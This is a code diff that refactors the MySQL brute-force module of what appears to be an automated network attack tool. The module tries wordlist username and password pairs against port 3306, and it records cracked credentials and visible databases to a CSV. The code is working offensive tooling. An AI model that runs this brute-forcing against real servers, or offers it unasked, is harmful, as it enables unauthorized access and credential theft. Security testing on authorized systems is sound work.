@@ -1,18 +1,20 @@
-import os
-import pymysql
-import threading
+"""
+sql_connector.py — MySQL brute force (port 3306).
+
+Thin adapter over BaseConnector (#12). Only attempt()/result_rows() and the module-level
+b_* discovery globals live here; queue/worker/run_bruteforce are shared.
+
+Two things make this the odd one out, both handled by class attributes rather than a fork of the
+worker: QUEUE_HAS_MAC is False (the CSV keys on IP, not MAC), and one successful auth writes one
+row per visible database.
+"""
 import logging
-import time
-from rich.console import Console
-from rich.progress import Progress, BarColumn, TextColumn, SpinnerColumn
-from queue import Queue
-from shared import SharedData, netkb_targets, append_csv_rows, dedupe_csv, credential_candidates, record_cracked_cred
+import pymysql
+from base_connector import BaseConnector, BaseBruteforce
 from logger import Logger
 
-# Configure the logger
 logger = Logger(name="sql_bruteforce.py", level=logging.DEBUG)
 
-# Define the necessary global variables
 b_class = "SQLBruteforce"
 b_module = "sql_connector"
 b_status = "brute_force_sql"
@@ -20,196 +22,63 @@ b_port = 3306
 b_parent = None
 
 
-class SQLBruteforce:
-    """
-    Class to handle the SQL brute force process.
-    """
-    def __init__(self, shared_data):
-        self.shared_data = shared_data
-        self.sql_connector = SQLConnector(shared_data)
-        logger.info("SQLConnector initialized.")
-    
-    def bruteforce_sql(self, ip, port, row=None):
-        """
-        Run the SQL brute force attack on the given IP and port.
-        """
-        return self.sql_connector.run_bruteforce(ip, port, row)
-    
-    def execute(self, ip, port, row, status_key):
-        """
-        Execute the brute force attack and update status.
-        """
-        # The only connector that never set this, so the panel kept showing the previous
-        # action for the whole SQL attack.
-        self.shared_data.bjornorch_status = "SQLBruteforce"
-        success, results = self.bruteforce_sql(ip, port, row)
-        return 'success' if success else 'failed'
+class SQLConnector(BaseConnector):
+    PORT = 3306
+    HEADER = "IP Address,User,Password,Port,Database\n"
+    OUTFILE_ATTR = "sqlfile"
+    PROGRESS_LABEL = "SQL"
+    # This connector's CSV has no MAC/Hostname columns, so the queue carries neither.
+    QUEUE_HAS_MAC = False
 
-class SQLConnector:
-    """
-    Class to manage the connection attempts and store the results.
-    """
-    def __init__(self, shared_data):
-        self.shared_data = shared_data
-        self.load_scan_file()
-        self.users = open(shared_data.usersfile, "r").read().splitlines()
-        self.passwords = open(shared_data.passwordsfile, "r").read().splitlines()
+    def attempt(self, adresse_ip, user, password):
+        """Connect and list databases. Returns the database list, or True if there are none.
 
-        self.lock = threading.Lock()
-        self.sqlfile = shared_data.sqlfile
-        if not os.path.exists(self.sqlfile):
-            with open(self.sqlfile, "w") as f:
-                f.write("IP Address,User,Password,Port,Database\n")
-        self.results = []
-        self.queue = Queue()
-        self.console = Console()
-
-    def load_scan_file(self):
-        """
-        Load the scan file and filter it for SQL ports.
-        """
-        self.scan = netkb_targets(self.shared_data.netkbfile, "3306")
-
-    def sql_connect(self, adresse_ip, user, password):
-        """
-        Attempt to connect to an SQL service using the given credentials without specifying a database.
+        `databases or True` is deliberate: authenticating IS the win here, so a server that lets us
+        in but shows no databases must still record the cracked credential. Returning the bare list
+        would make that read as a failed login. Contrast SMB, where an empty list genuinely means
+        no accessible share and so is correctly falsy.
         """
         try:
-            # Première tentative sans spécifier de base de données
             conn = pymysql.connect(
                 host=adresse_ip,
                 user=user,
                 password=password,
                 port=3306,
-                connect_timeout=10,
+                connect_timeout=10,   # #4: bound the connect and both I/O directions
                 read_timeout=15,
                 write_timeout=15,
             )
-            
-            # Si la connexion réussit, récupérer la liste des bases de données
             with conn.cursor() as cursor:
                 cursor.execute("SHOW DATABASES")
                 databases = [db[0] for db in cursor.fetchall()]
-                
             conn.close()
             logger.info(f"Successfully connected to {adresse_ip} with user {user}")
             logger.info(f"Available databases: {', '.join(databases)}")
-            
-            # Sauvegarder les informations avec la liste des bases trouvées
-            return True, databases
-            
+            return databases or True
         except pymysql.Error as e:
             logger.error(f"Failed to connect to {adresse_ip} with user {user}: {e}")
-            return False, []
+            return False
+
+    def result_rows(self, outcome, adresse_ip, user, password, mac_address, hostname, port):
+        """One row per database. `outcome` is True (authenticated, nothing visible) or the list."""
+        databases = outcome if isinstance(outcome, list) else []
+        return [[adresse_ip, user, password, port, db] for db in databases]
 
 
-    def worker(self, progress, task_id, success_flag):
-        """
-        Worker thread to process items in the queue.
-        """
-        while not self.queue.empty():
-            if self.shared_data.orchestrator_should_exit:
-                logger.info("Orchestrator exit signal received, stopping worker thread.")
-                break
+class SQLBruteforce(BaseBruteforce):
+    connector_class = SQLConnector
+    display_name = "SQLBruteforce"
 
-            adresse_ip, user, password, port = self.queue.get()
-            # try/finally so task_done() ALWAYS runs — a raise here would otherwise kill the worker
-            # before it and hang the orchestrator on queue.join().
-            try:
-                success, databases = self.sql_connect(adresse_ip, user, password)
-
-                if success:
-                    with self.lock:
-                        # Ajouter une entrée pour chaque base de données trouvée
-                        for db in databases:
-                            self.results.append([adresse_ip, user, password, port, db])
-                        record_cracked_cred(self.shared_data, user, password)
-
-                        logger.success(f"Found credentials for IP: {adresse_ip} | User: {user} | Password: {password}")
-                        logger.success(f"Databases found: {', '.join(databases)}")
-                        self.save_results()
-                        self.remove_duplicates()
-                        success_flag[0] = True
-            except Exception as e:
-                logger.error(f"sql_connect failed for {adresse_ip} as {user}: {e}")
-            finally:
-                self.queue.task_done()
-            progress.update(task_id, advance=1)
-
-    def run_bruteforce(self, adresse_ip, port, row=None):
-        # No load_scan_file() here: this connector parsed the whole of netkb.csv and then never
-        # touched self.scan — a full CSV read per host per cycle for nothing.
-
-        candidates = credential_candidates(self.shared_data, self.users, self.passwords)
-        total_tasks = len(candidates)
-
-        for user, password in candidates:
-            if self.shared_data.orchestrator_should_exit:
-                logger.info("Orchestrator exit signal received, stopping bruteforce task addition.")
-                return False, []
-            self.queue.put((adresse_ip, user, password, port))
-
-        success_flag = [False]
-        threads = []
-
-        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%")) as progress:
-            task_id = progress.add_task("[cyan]Bruteforcing SQL...", total=total_tasks)
-
-            for _ in range(self.shared_data.bruteforce_threads):  # config-driven, core-aware (shared_data.bruteforce_threads)
-                t = threading.Thread(target=self.worker, args=(progress, task_id, success_flag))
-                t.start()
-                threads.append(t)
-
-            while not self.queue.empty():
-                if self.shared_data.orchestrator_should_exit:
-                    logger.info("Orchestrator exit signal received, stopping bruteforce.")
-                    while not self.queue.empty():
-                        self.queue.get()
-                        self.queue.task_done()
-                    break
-                # Yield. With no exit signal this body does nothing, so it span a core flat
-                # out for the whole attack, competing with the worker threads it waits on.
-                # queue.join() below already blocks correctly; this loop exists only to
-                # notice an exit signal and drain the queue.
-                time.sleep(0.2)
-
-            self.queue.join()
-
-            for t in threads:
-                t.join()
-
-        logger.info(f"Bruteforcing complete with success status: {success_flag[0]}")
-        return success_flag[0], self.results  # Return True and the list of successes if at least one attempt was successful
-
-    def save_results(self):
-        """
-        Save the results of successful connection attempts to a CSV file.
-        """
-        append_csv_rows(self.sqlfile, self.results)
-        logger.info(f"Saved results to {self.sqlfile}")
-        self.results = []
-
-    def remove_duplicates(self):
-        """
-        Remove duplicate entries from the results CSV file.
-        """
-        dedupe_csv(self.sqlfile)
 
 if __name__ == "__main__":
+    from shared import SharedData
     shared_data = SharedData()
     try:
         sql_bruteforce = SQLBruteforce(shared_data)
-        logger.info("[bold green]Starting SQL brute force attack on port 3306[/bold green]")
-        
-        # Load the IPs to scan from shared data
-        ips_to_scan = shared_data.read_data()
-        
-        # Execute brute force attack on each IP
-        for row in ips_to_scan:
+        logger.info("Starting SQL brute-force attack on port 3306...")
+        for row in shared_data.read_data():
             ip = row["IPs"]
             sql_bruteforce.execute(ip, b_port, row, b_status)
-        
-        logger.info(f"Total successful attempts: {len(sql_bruteforce.sql_connector.results)}")
-        exit(len(sql_bruteforce.sql_connector.results))
+        logger.info(f"Total successful attempts: {len(sql_bruteforce.connector.results)}")
     except Exception as e:
         logger.error(f"Error: {e}")
